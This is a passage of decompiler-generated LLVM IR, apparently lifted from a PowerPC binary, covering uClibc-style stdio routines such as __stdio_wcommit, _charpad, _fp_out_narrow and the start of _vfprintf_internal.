  %storemerge1 = load i32, i32* %v2_100035dc, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_100035e0 = icmp eq i32 %storemerge1, 0
  br i1 %v3_100035e0, label %dec_label_pc_100035e8, label %dec_label_pc_100035c8

dec_label_pc_100035e8:                            ; preds = %dec_label_pc_100035dc, %dec_label_pc_100035bc
  %v0_100035f8 = phi i32 [ %v0_100035f816, %dec_label_pc_100035bc ], [ %v0_100035f817, %dec_label_pc_100035dc ]
  ret i32 %v0_100035f8

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_100035c8, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_100035dc, { 1, 0 }
  uselistorder label %dec_label_pc_100035c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000359c, { 1, 0 }
  uselistorder label %dec_label_pc_10003570, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_10003604 = load i32, i32* @r31, align 4
  %v0_10003608 = load i32, i32* @r3, align 4
  %v1_10003610 = add i32 %v0_10003608, 8
  %v2_10003610 = inttoptr i32 %v1_10003610 to i32*
  %v3_10003610 = load i32, i32* %v2_10003610, align 4
  %v1_10003614 = add i32 %v0_10003608, 16
  %v2_10003614 = inttoptr i32 %v1_10003614 to i32*
  %v3_10003614 = load i32, i32* %v2_10003614, align 4
  %v2_1000361c = sub i32 %v3_10003614, %v3_10003610
  store i32 %v2_1000361c, i32* @r5, align 4
  %v5_1000361c = icmp eq i32 %v2_1000361c, 0
  br i1 %v5_1000361c, label %dec_label_pc_1000362c, label %dec_label_pc_10003624

dec_label_pc_10003624:                            ; preds = %entry
  store i32 %v3_10003610, i32* %v2_10003614, align 4
  store i32 268449324, i32* @lr, align 4
  %v2_10003628 = inttoptr i32 %v3_10003610 to i16*
  %v3_10003628 = call i32 @__stdio_WRITE(i16* %v2_10003628, i32 %v2_1000361c)
  %v0_1000362c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000362c

dec_label_pc_1000362c:                            ; preds = %entry, %dec_label_pc_10003624
  %v0_1000362c = phi i32 [ %v0_10003608, %entry ], [ %v0_1000362c.pre, %dec_label_pc_10003624 ]
  %v1_1000362c = add i32 %v0_1000362c, 8
  %v2_1000362c = inttoptr i32 %v1_1000362c to i32*
  %v3_1000362c = load i32, i32* %v2_1000362c, align 4
  %v1_10003630 = add i32 %v0_1000362c, 16
  %v2_10003630 = inttoptr i32 %v1_10003630 to i32*
  %v3_10003630 = load i32, i32* %v2_10003630, align 4
  store i32 %v0_10003604, i32* @r31, align 4
  %v2_10003638 = sub i32 %v3_10003630, %v3_1000362c
  ret i32 %v2_10003638

; uselistorder directives
  uselistorder i32 %v0_1000362c, { 1, 0 }
  uselistorder i32 %v3_10003610, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000362c, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_100036743 = icmp eq i32 %arg3, 0
  %v2_10003678 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_100036743, label %dec_label_pc_10003694, label %dec_label_pc_10003688

dec_label_pc_10003670:                            ; preds = %dec_label_pc_10003688
  %v1_10003670 = add i32 %v0_10003670, -1
  store i32 %v1_10003670, i32* @r31, align 4
  %v3_10003674 = icmp eq i32 %v1_10003670, 0
  %v0_10003680 = load i32, i32* @r29, align 4
  br i1 %v3_10003674, label %dec_label_pc_10003694.loopexit, label %dec_label_pc_10003688

dec_label_pc_10003688:                            ; preds = %entry, %dec_label_pc_10003670
  %v0_100036805 = phi i32 [ %v0_10003680, %dec_label_pc_10003670 ], [ %arg1, %entry ]
  store i32 268449420, i32* @lr, align 4
  %v3_10003688 = inttoptr i32 %v0_100036805 to i16*
  %v4_10003688 = call i32 @__stdio_fwrite(i32 %v2_10003678, i32 1, i16* %v3_10003688)
  %v3_1000368c = icmp eq i32 %v4_10003688, 1
  %v0_10003670 = load i32, i32* @r31, align 4
  br i1 %v3_1000368c, label %dec_label_pc_10003670, label %dec_label_pc_10003694.loopexit

dec_label_pc_10003694.loopexit:                   ; preds = %dec_label_pc_10003670, %dec_label_pc_10003688
  %v0_10003698.ph = phi i32 [ %v0_10003670, %dec_label_pc_10003688 ], [ 0, %dec_label_pc_10003670 ]
  %v1_10003698.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10003694

dec_label_pc_10003694:                            ; preds = %dec_label_pc_10003694.loopexit, %entry
  %v1_10003698 = phi i32 [ 0, %entry ], [ %v1_10003698.pre, %dec_label_pc_10003694.loopexit ]
  %v0_10003698 = phi i32 [ 0, %entry ], [ %v0_10003698.ph, %dec_label_pc_10003694.loopexit ]
  %v2_10003698 = sub i32 %v1_10003698, %v0_10003698
  ret i32 %v2_10003698

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10003694.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10003688, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_100036c0 = and i32 %arg2, 128
  %v3_100036c0 = icmp eq i32 %v1_100036c0, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_100036c0, label %dec_label_pc_10003710, label %dec_label_pc_100036dc

dec_label_pc_100036dc:                            ; preds = %entry
  %v0_100036dc = call i32 @__GI_strlen()
  %v0_100036e0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100036dc, i32* @r31, align 4
  %v0_100036e8 = load i32, i32* %r26.global-to-local, align 4
  %v1_100036ec = load i32, i32* %r30.global-to-local, align 4
  %v2_100036ec = sub i32 %v1_100036ec, %v0_100036dc
  store i32 %v2_100036ec, i32* %r29.global-to-local, align 4
  store i32 %v0_100036dc, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_100036ec, 1
  br i1 %tmp7, label %dec_label_pc_10003710, label %dec_label_pc_100036fc

dec_label_pc_100036fc:                            ; preds = %dec_label_pc_100036dc
  %v1_100036e0 = urem i32 %v0_100036e0, 128
  store i32 268449536, i32* @lr, align 4
  %v3_100036fc = trunc i32 %v1_100036e0 to i8
  %v4_100036fc = call i32 @_charpad(i32 %v0_100036e8, i8 %v3_100036fc, i32 %v2_100036ec)
  %v0_10003700 = load i32, i32* @r31, align 4
  store i32 %v0_10003700, i32* %r30.global-to-local, align 4
  %v1_10003704 = load i32, i32* @r29, align 4
  %v4_10003704 = icmp eq i32 %v4_100036fc, %v1_10003704
  store i32 %v4_100036fc, i32* @r28, align 4
  br i1 %v4_10003704, label %dec_label_pc_100036fc.dec_label_pc_10003710_crit_edge, label %dec_label_pc_10003734

dec_label_pc_100036fc.dec_label_pc_10003710_crit_edge: ; preds = %dec_label_pc_100036fc
  %v0_1000371c.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10003710

dec_label_pc_10003710:                            ; preds = %dec_label_pc_100036fc.dec_label_pc_10003710_crit_edge, %dec_label_pc_100036dc, %entry
  %v0_1000371c = phi i32 [ %v0_1000371c.pre, %dec_label_pc_100036fc.dec_label_pc_10003710_crit_edge ], [ %v0_100036e8, %dec_label_pc_100036dc ], [ %arg1, %entry ]
  %v0_10003718 = phi i32 [ %v0_10003700, %dec_label_pc_100036fc.dec_label_pc_10003710_crit_edge ], [ %v0_100036dc, %dec_label_pc_100036dc ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_10003718, 1
  br i1 %tmp8, label %dec_label_pc_10003730, label %dec_label_pc_10003728

dec_label_pc_10003728:                            ; preds = %dec_label_pc_10003710
  %v0_10003714 = load i32, i32* @r27, align 4
  store i32 268449580, i32* @lr, align 4
  %v3_10003728 = inttoptr i32 %v0_1000371c to i16*
  %v4_10003728 = call i32 @__stdio_fwrite(i32 %v0_10003714, i32 %v0_10003718, i16* %v3_10003728)
  br label %dec_label_pc_10003730

dec_label_pc_10003730:                            ; preds = %dec_label_pc_10003710, %dec_label_pc_10003728
  %v1_10003730 = phi i32 [ 0, %dec_label_pc_10003710 ], [ %v4_10003728, %dec_label_pc_10003728 ]
  %v0_10003730 = load i32, i32* @r28, align 4
  %v2_10003730 = add i32 %v0_10003730, %v1_10003730
  br label %dec_label_pc_10003734

dec_label_pc_10003734:                            ; preds = %dec_label_pc_100036fc, %dec_label_pc_10003730
  %v0_10003738 = phi i32 [ %v4_100036fc, %dec_label_pc_100036fc ], [ %v2_10003730, %dec_label_pc_10003730 ]
  ret i32 %v0_10003738

; uselistorder directives
  uselistorder i32 %v0_10003718, { 1, 0 }
  uselistorder i32 %v2_100036ec, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10003734, { 1, 0 }
  uselistorder label %dec_label_pc_10003730, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_3()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_3()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_10003750 = load i32, i32* @lr, align 4
  store i32 %v0_10003750, i32* %r0.global-to-local, align 4
  %v2_10003758 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_10003758, i32* %r30.global-to-local, align 4
  %v0_1000375c = load i32, i32* @r3, align 4
  store i32 %v0_1000375c, i32* %r24.global-to-local, align 4
  %v0_10003768 = load i32, i32* @r5, align 4
  store i32 %v0_10003768, i32* %r31.global-to-local, align 4
  %v0_1000376c = load i32, i32* @r4, align 4
  store i32 %v0_1000376c, i32* @r29, align 4
  store i32 268449652, i32* @lr, align 4
  %v1_10003770 = bitcast i8** %stack_var_-200 to i32*
  %v2_10003770 = call i32 @_ppfs_init(i32* %v1_10003770)
  %tmp72 = icmp sgt i32 %v2_10003770, -1
  br i1 %tmp72, label %dec_label_pc_100037a4, label %dec_label_pc_1000377c

dec_label_pc_1000377c:                            ; preds = %entry
  %v3_1000377c = load i8*, i8** %stack_var_-200, align 4
  %v4_1000377c = ptrtoint i8* %v3_1000377c to i32
  store i32 %v4_1000377c, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_1000377c, i32* @r3, align 4
  %v0_10003788 = call i32 @__GI_strlen()
  %v3_1000378c = icmp eq i32 %v0_10003788, 0
  br i1 %v3_1000378c, label %dec_label_pc_10003da4, label %dec_label_pc_10003794

dec_label_pc_10003794:                            ; preds = %dec_label_pc_1000377c
  %v0_10003794 = load i32, i32* @r31, align 4
  %v0_10003798 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100037a0.355 to i32), i32* @lr, align 4
  %v3_1000379c = inttoptr i32 %v0_10003798 to i16*
  %v4_1000379c = call i32 @__stdio_fwrite(i32 %v0_10003794, i32 %v0_10003788, i16* %v3_1000379c)
  br label %dec_label_pc_10003da4

dec_label_pc_100037a4:                            ; preds = %entry
  %v0_100037a8 = load i32, i32* @r31, align 4
  store i32 268449712, i32* @lr, align 4
  %v2_100037ac = call i32 @_ppfs_prepargs(i32 %v2_10003758, i32 %v0_100037a8)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_10003844 = zext i8 %tmp59 to i32
  %v2_10003848 = icmp sgt i32 %tmp60, 0
  %v2_1000384c = ptrtoint i32* %stack_var_-112 to i32
  %v2_10003870 = ptrtoint i32* %stack_var_-344 to i32
  %v3_10003874 = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_100038a8 = icmp eq i32 %tmp57, 0
  %v2_10003c04 = ptrtoint i32* %stack_var_-328 to i32
  %v2_10003b24 = ptrtoint i32* %stack_var_-340 to i32
  %v2_10003b28 = ptrtoint i32* %stack_var_-336 to i32
  %v5_1000399c = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_10003a78 = icmp eq i32 %tmp57, 1
  %v2_10003a1c = icmp ugt i32 %tmp57, 2
  %v4_1000395c = zext i8 %tmp55 to i32
  %v0_10003d90.pre = load i32, i32* @r29, align 4
  %v1_1000385c = mul nuw nsw i32 %v4_10003844, 8
  %v2_10003860 = add i32 %v2_1000384c, %v1_1000385c
  %v1_10003864 = add i32 %v2_10003860, -8
  %v1_10003878 = add i32 %tmp58, 1
  %v2_100038d0 = icmp ugt i32 %tmp57, 7
  %v2_10003ab0 = icmp ugt i32 %tmp57, 15
  %v2_10003ae4 = icmp ugt i32 %tmp57, 17
  %v3_10003ae4 = icmp eq i32 %tmp57, 17
  %v2_10003b8c = icmp ugt i32 %tmp57, 19
  %v3_10003b8c = icmp eq i32 %tmp57, 19
  %v3_10003bf8 = icmp eq i32 %tmp57, 20
  %v1_100038e8 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1000bcdc.357 to i32), i32 -1)
  %v2_100038e8 = inttoptr i32 %v1_100038e8 to i8*
  %v3_10003a28 = icmp eq i32 %tmp57, 3
  %v3_10003a38 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_10003d90

dec_label_pc_100037bc.backedge:                   ; preds = %dec_label_pc_10003810, %dec_label_pc_100037c8
  %storemerge13.in = phi i32 [ %v1_100037d8, %dec_label_pc_100037c8 ], [ %v1_10003810, %dec_label_pc_10003810 ]
  %v1_100037d016 = phi i32 [ %v0_100037e8, %dec_label_pc_100037c8 ], [ %v1_10003810, %dec_label_pc_10003810 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_100037bc

dec_label_pc_100037bc:                            ; preds = %dec_label_pc_100037bc.backedge, %dec_label_pc_10003d90
  %v0_100037e8 = phi i32 [ %v1_100037d016, %dec_label_pc_100037bc.backedge ], [ %v0_10003d90, %dec_label_pc_10003d90 ]
  %v1_100037d8 = phi i32 [ %storemerge13, %dec_label_pc_100037bc.backedge ], [ %v0_10003d90, %dec_label_pc_10003d90 ]
  %v1_100037bc = inttoptr i32 %v1_100037d8 to i8*
  %v2_100037bc = load i8, i8* %v1_100037bc, align 1
  %v3_100037bc = zext i8 %v2_100037bc to i32
  store i32 %v3_100037bc, i32* %r0.global-to-local, align 4
  %v3_100037c0 = icmp eq i8 %v2_100037bc, 0
  br i1 %v3_100037c0, label %dec_label_pc_100037d0, label %dec_label_pc_100037c8

dec_label_pc_100037c8:                            ; preds = %dec_label_pc_100037bc
  %v3_100037c8 = icmp eq i8 %v2_100037bc, 37
  br i1 %v3_100037c8, label %dec_label_pc_100037d0, label %dec_label_pc_100037bc.backedge

dec_label_pc_100037d0:                            ; preds = %dec_label_pc_100037c8, %dec_label_pc_100037bc
  %v4_100037d0 = icmp eq i32 %v1_100037d8, %v0_100037e8
  br i1 %v4_100037d0, label %dec_label_pc_10003804, label %dec_label_pc_100037d8

dec_label_pc_100037d8:                            ; preds = %dec_label_pc_100037d0
  %v2_100037d8 = sub i32 %v1_100037d8, %v0_100037e8
  store i32 %v2_100037d8, i32* @r31, align 4
  %v4_100037d8 = icmp sgt i32 %v2_100037d8, 0
  br i1 %v4_100037d8, label %dec_label_pc_100037e8, label %dec_label_pc_100037f8

dec_label_pc_100037e8:                            ; preds = %dec_label_pc_100037d8
  %v0_100037f0 = load i32, i32* %r24.global-to-local, align 4
  store i32 268449784, i32* @lr, align 4
  %v3_100037f4 = inttoptr i32 %v0_100037f0 to i16*
  %v4_100037f4 = call i32 @__stdio_fwrite(i32 %v0_100037e8, i32 %v2_100037d8, i16* %v3_100037f4)
  %v1_100037f8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100037f8

dec_label_pc_100037f8:                            ; preds = %dec_label_pc_100037d8, %dec_label_pc_100037e8
  %v1_10003800 = phi i32 [ %v1_100037f8.pre, %dec_label_pc_100037e8 ], [ %v2_100037d8, %dec_label_pc_100037d8 ]
  %storemerge2 = phi i32 [ %v4_100037f4, %dec_label_pc_100037e8 ], [ 0, %dec_label_pc_100037d8 ]
  %v4_100037f8 = icmp eq i32 %storemerge2, %v1_10003800
  br i1 %v4_100037f8, label %dec_label_pc_10003800, label %dec_label_pc_10003da0

dec_label_pc_10003800:                            ; preds = %dec_label_pc_100037f8
  %v0_10003800 = load i32, i32* %r23.global-to-local, align 4
  %v2_10003800 = add i32 %v0_10003800, %v1_10003800
  store i32 %v2_10003800, i32* %r23.global-to-local, align 4
  %v0_10003804.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10003804

dec_label_pc_10003804:                            ; preds = %dec_label_pc_100037d0, %dec_label_pc_10003800
  %v0_10003810 = phi i32 [ %v0_100037e8, %dec_label_pc_100037d0 ], [ %v0_10003804.pre, %dec_label_pc_10003800 ]
  %v1_10003804 = inttoptr i32 %v0_10003810 to i8*
  %v2_10003804 = load i8, i8* %v1_10003804, align 1
  %v3_10003804 = zext i8 %v2_10003804 to i32
  store i32 %v3_10003804, i32* %r0.global-to-local, align 4
  %v3_10003808 = icmp eq i8 %v2_10003804, 0
  br i1 %v3_10003808, label %dec_label_pc_10003da4, label %dec_label_pc_10003810

dec_label_pc_10003810:                            ; preds = %dec_label_pc_10003804
  %v1_10003810 = add i32 %v0_10003810, 1
  %v2_10003810 = inttoptr i32 %v1_10003810 to i8*
  %v3_10003810 = load i8, i8* %v2_10003810, align 1
  %v4_10003810 = zext i8 %v3_10003810 to i32
  store i32 %v4_10003810, i32* %r0.global-to-local, align 4
  %v3_10003818 = icmp eq i8 %v3_10003810, 37
  br i1 %v3_10003818, label %dec_label_pc_100037bc.backedge, label %dec_label_pc_10003820

dec_label_pc_10003820:                            ; preds = %dec_label_pc_10003810
  store i32 %v2_10003758, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_10003810, i8** %stack_var_-200, align 4
  store i32 268449848, i32* @lr, align 4
  %v3_10003834 = call i32 @_ppfs_parsespec(i32* %v1_10003770, i32 %v1_10003810)
  store i32 %v2_10003758, i32* @r3, align 4
  store i32 268449856, i32* @lr, align 4
  %v0_1000383c = call i32 @_ppfs_setargs()
  store i32 %v4_10003844, i32* @r7, align 4
  store i32 %v2_1000384c, i32* %r0.global-to-local, align 4
  br i1 %v2_10003848, label %dec_label_pc_1000385c, label %dec_label_pc_10003868

dec_label_pc_1000385c:                            ; preds = %dec_label_pc_10003820
  br label %dec_label_pc_10003868

dec_label_pc_10003868:                            ; preds = %dec_label_pc_10003820, %dec_label_pc_1000385c
  %v0_1000389482 = phi i32 [ %v1_10003864, %dec_label_pc_1000385c ], [ %v2_1000384c, %dec_label_pc_10003820 ]
  store i32 %v0_1000389482, i32* %r10.global-to-local, align 4
  store i32 %v2_10003870, i32* %r8.global-to-local, align 4
  store i32 %v1_10003878, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_10003898.preheader, label %dec_label_pc_10003898.preheader.thread

dec_label_pc_10003898.preheader.thread:           ; preds = %dec_label_pc_10003868
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100038a4

dec_label_pc_10003898.preheader:                  ; preds = %dec_label_pc_10003868
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_10003874, label %dec_label_pc_100038a4, label %dec_label_pc_10003890.preheader

dec_label_pc_10003890.preheader:                  ; preds = %dec_label_pc_10003898.preheader
  store i32 %v0_1000389482, i32* %stack_var_-344, align 4
  %v1_1000389483 = add i32 %v0_1000389482, 8
  store i32 %v1_1000389483, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_100038a088 = add i32 %tmp58, -1
  store i32 %v1_100038a088, i32* %ctr.global-to-local, align 4
  %v2_100038a089 = icmp eq i32 %v1_100038a088, 0
  br i1 %v2_100038a089, label %dec_label_pc_100038a4, label %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge

dec_label_pc_10003890.dec_label_pc_10003890_crit_edge: ; preds = %dec_label_pc_10003890.preheader, %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge
  %v1_10003890.pre = phi i32 [ %v1_10003890.pre.pre, %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge ], [ %v2_10003870, %dec_label_pc_10003890.preheader ]
  %v1_1000389891 = phi i32 [ %v1_10003898, %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge ], [ 4, %dec_label_pc_10003890.preheader ]
  %v1_1000389490 = phi i32 [ %v1_10003894, %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge ], [ %v1_1000389483, %dec_label_pc_10003890.preheader ]
  %v3_10003890 = add i32 %v1_10003890.pre, %v1_1000389891
  %v4_10003890 = inttoptr i32 %v3_10003890 to i32*
  store i32 %v1_1000389490, i32* %v4_10003890, align 4
  %v0_10003894 = load i32, i32* %r10.global-to-local, align 4
  %v1_10003894 = add i32 %v0_10003894, 8
  store i32 %v1_10003894, i32* %r10.global-to-local, align 4
  %v0_10003898 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003898 = mul i32 %v0_10003898, 4
  store i32 %v1_10003898, i32* %r0.global-to-local, align 4
  %v1_1000389c = add i32 %v0_10003898, 1
  store i32 %v1_1000389c, i32* %r11.global-to-local, align 4
  %v0_100038a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100038a0 = add i32 %v0_100038a0, -1
  store i32 %v1_100038a0, i32* %ctr.global-to-local, align 4
  %v2_100038a0 = icmp eq i32 %v1_100038a0, 0
  br i1 %v2_100038a0, label %dec_label_pc_100038a4, label %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge

dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge: ; preds = %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge
  %v1_10003890.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge

dec_label_pc_100038a4:                            ; preds = %dec_label_pc_10003890.preheader, %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge, %dec_label_pc_10003898.preheader.thread, %dec_label_pc_10003898.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_100038a8, label %dec_label_pc_100038b0, label %dec_label_pc_100038d0

dec_label_pc_100038b0:                            ; preds = %dec_label_pc_100038a4
  %v0_100038b4 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_100038b4, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_100038b4, 0
  %v1_100038bc = zext i1 %tmp96 to i32
  %v2_100038bc = ashr i32 %v0_100038b4, 31
  %v3_100038bc = and i32 %v2_100038bc, -2
  %v4_100038bc = or i32 %v3_100038bc, %v1_100038bc
  store i32 %v4_100038bc, i32* @r5, align 4
  %v1_100038c4 = call i32 @__asm_rlwinm(i32 %v0_100039e4, i32 0, i32 20, i32 23)
  store i32 %v1_100038c4, i32* @r4, align 4
  %v1_100038c8 = inttoptr i32 %v1_100038c4 to i16*
  %v2_100038c8 = call i32 @_store_inttype(i16* %v1_100038c8)
  br label %dec_label_pc_10003d8c

dec_label_pc_100038d0:                            ; preds = %dec_label_pc_100038a4
  br i1 %v2_100038d0, label %dec_label_pc_10003ab0, label %dec_label_pc_100038d8

dec_label_pc_100038d8:                            ; preds = %dec_label_pc_100038d0
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_100038e8 = load i8, i8* %v2_100038e8, align 1
  %v4_100038e8 = zext i8 %v3_100038e8 to i32
  store i32 %v4_100038e8, i32* %r30.global-to-local, align 4
  %v3_100038ec = icmp eq i8 %v3_100038e8, 10
  br i1 %v3_100038ec, label %dec_label_pc_100038f4, label %dec_label_pc_1000391c

dec_label_pc_100038f4:                            ; preds = %dec_label_pc_100038d8
  store i32 %v0_100039e4, i32* %r0.global-to-local, align 4
  %v1_100038f8 = call i32 @__asm_rlwinm(i32 %v0_100039e4, i32 26, i32 31, i32 31)
  %v1_100038fc = call i32 @__asm_rlwinm(i32 %v0_100039e4, i32 27, i32 31, i32 31)
  %v3_10003900 = icmp eq i32 %v1_100038f8, 0
  %v2_10003904 = icmp ne i32 %v1_100038fc, 0
  %not.v2_10003904 = xor i1 %v2_10003904, true
  %v6_10003908 = sext i1 %not.v2_10003904 to i32
  store i32 %v6_10003908, i32* %r0.global-to-local, align 4
  %v1_10003910 = select i1 %v2_10003904, i32 44, i32 87
  store i32 %v1_10003910, i32* %r31.global-to-local, align 4
  br i1 %v3_10003900, label %dec_label_pc_1000391c, label %dec_label_pc_10003918

dec_label_pc_10003918:                            ; preds = %dec_label_pc_100038f4
  %v1_10003918 = or i32 %v1_10003910, 128
  store i32 %v1_10003918, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000391c

dec_label_pc_1000391c:                            ; preds = %dec_label_pc_100038d8, %dec_label_pc_100038f4, %dec_label_pc_10003918
  %v0_1000391c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000391c = icmp ugt i32 %v0_1000391c, 5
  br i1 %v2_1000391c, label %dec_label_pc_10003944, label %dec_label_pc_10003924

dec_label_pc_10003924:                            ; preds = %dec_label_pc_1000391c
  %v3_10003924 = icmp eq i32 %v0_1000391c, 3
  br i1 %v3_10003924, label %dec_label_pc_1000392c, label %dec_label_pc_10003934

dec_label_pc_1000392c:                            ; preds = %dec_label_pc_10003924
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10003948

dec_label_pc_10003934:                            ; preds = %dec_label_pc_10003924
  %v3_10003934 = icmp eq i32 %v0_1000391c, 1
  br i1 %v3_10003934, label %dec_label_pc_1000394c, label %dec_label_pc_10003948

dec_label_pc_10003944:                            ; preds = %dec_label_pc_1000391c
  %v0_10003944 = load i32, i32* %r30.global-to-local, align 4
  %v1_10003944 = sub i32 0, %v0_10003944
  store i32 %v1_10003944, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10003948

dec_label_pc_10003948:                            ; preds = %dec_label_pc_10003934, %dec_label_pc_1000392c, %dec_label_pc_10003944
  br label %dec_label_pc_1000394c

dec_label_pc_1000394c:                            ; preds = %dec_label_pc_10003934, %dec_label_pc_10003948
  %storemerge3 = phi i32 [ 11, %dec_label_pc_10003948 ], [ 6, %dec_label_pc_10003934 ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_1000394c = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000394c, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_1000394c, -1
  br i1 %tmp75, label %dec_label_pc_10003960, label %dec_label_pc_1000395c

dec_label_pc_1000395c:                            ; preds = %dec_label_pc_1000394c
  br label %dec_label_pc_10003960

dec_label_pc_10003960:                            ; preds = %dec_label_pc_1000394c, %dec_label_pc_1000395c
  %storemerge = phi i32 [ %v4_1000395c, %dec_label_pc_1000395c ], [ 32, %dec_label_pc_1000394c ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_10003960 = icmp eq i32 %v0_1000391c, 1
  br i1 %v3_10003960, label %dec_label_pc_1000397c, label %dec_label_pc_1000396c

dec_label_pc_1000396c:                            ; preds = %dec_label_pc_10003960
  %v0_1000396c = load i32, i32* @r7, align 4
  %v1_1000396c = mul i32 %v0_1000396c, 4
  store i32 %v1_1000396c, i32* %r0.global-to-local, align 4
